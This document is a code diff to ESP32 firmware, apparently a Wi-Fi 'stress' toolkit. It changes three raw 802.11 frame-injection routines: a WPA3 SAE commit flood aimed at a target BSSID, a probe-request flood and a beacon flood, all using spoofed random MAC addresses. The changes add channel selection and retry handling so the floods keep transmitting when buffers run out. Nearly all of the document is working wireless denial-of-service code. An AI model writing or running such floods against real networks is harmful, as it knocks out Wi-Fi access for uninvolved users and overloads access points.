@@ -5,11 +5,18 @@
 #include "esp_wifi.h"
 #include "esp_timer.h"
 #include "esp_random.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
 
 namespace politician {
 namespace stress {
 
-void saeCommitFlood(const uint8_t* bssid, uint32_t count) {
+void saeCommitFlood(const uint8_t* bssid, uint32_t count, uint8_t channel) {
+    if (!bssid || count == 0) return;
+    if (channel >= 1) {
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    }
+
     // 802.11 Authentication Frame Header (WPA3 SAE)
     uint8_t pkt[42] = {
         0xB0, 0x00, 0x3C, 0x00, // Frame Control (Auth), Duration
@@ -41,11 +48,22 @@ void saeCommitFlood(const uint8_t* bssid, uint32_t count) {
         pkt[10] &= 0xFE; // Ensure Unicast
         pkt[10] |= 0x02; // Mark as Locally Administered MAC
 
-        esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        if (err == ESP_ERR_NO_MEM) {
+            vTaskDelay(1);
+            esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        } else if ((i & 0x1F) == 0x1F) {
+            vTaskDelay(1);
+        }
     }
 }
 
-void probeRequestFlood(uint32_t count) {
+void probeRequestFlood(uint32_t count, uint8_t channel) {
+    if (count == 0) return;
+    if (channel >= 1) {
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    }
+
     // 802.11 Probe Request Frame Header
     uint8_t pkt[36] = {
         0x40, 0x00, 0x00, 0x00, // Frame Control (Probe Req), Duration
@@ -69,7 +87,13 @@ void probeRequestFlood(uint32_t count) {
         pkt[10] &= 0xFE; 
         pkt[10] |= 0x02; 
         
-        esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        if (err == ESP_ERR_NO_MEM) {
+            vTaskDelay(1);
+            esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        } else if ((i & 0x1F) == 0x1F) {
+            vTaskDelay(1);
+        }
     }
 }
 
@@ -111,8 +135,12 @@ void beaconFlood(const char **ssids, uint8_t ssidCount,
         memcpy(frame + p, rates, 8); p += 8;
         frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = channel;
 
-        esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
-        delay(5);
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
+        if (err == ESP_ERR_NO_MEM) {
+            vTaskDelay(1);
+            esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
+        }
+        vTaskDelay(pdMS_TO_TICKS(5));
     }
 }
 } // namespace stress
